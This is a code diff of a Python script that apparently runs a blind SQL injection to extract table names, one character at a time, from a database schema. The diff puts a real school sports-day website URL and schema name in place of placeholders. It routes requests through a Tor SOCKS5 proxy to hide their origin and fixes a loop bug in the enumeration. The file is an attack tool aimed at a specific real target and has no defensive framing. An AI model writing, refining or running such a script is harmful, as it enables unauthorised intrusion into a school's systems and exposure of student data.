@@ -1,8 +1,8 @@
 import time
 import requests
 
-url = "--target--"
-schema = "--target--"
+url = "http://sports.hys.edu.hk/aos/e-sportsday/student/index.php"
+schema = "sch_sportsday_hys_eng"
 
 #DO NOT CHANGE THIS PART
 prox = {'http': "socks5://127.0.0.1:9050"}
@@ -25,12 +25,11 @@ out = open("tablenamebyschema.txt","a")
 
 tablecount = 74
 tablestart = 21
-isTableFinished = False
-
 correct = "p"
 
 
 for table in range(tablestart,tablecount):
+    isTableFinished = False
     char = 1
     temp = ""
     out.write(str(table)+" ")
@@ -62,7 +61,7 @@ for table in range(tablestart,tablecount):
             print("table done")
             out.write("\n")
             isTableFinished = True
-    isTableFinished = False
+    
     print("Table "+str(table)+": "+temp)
     print("next table")
 localtime = time.asctime( time.localtime(time.time()) )
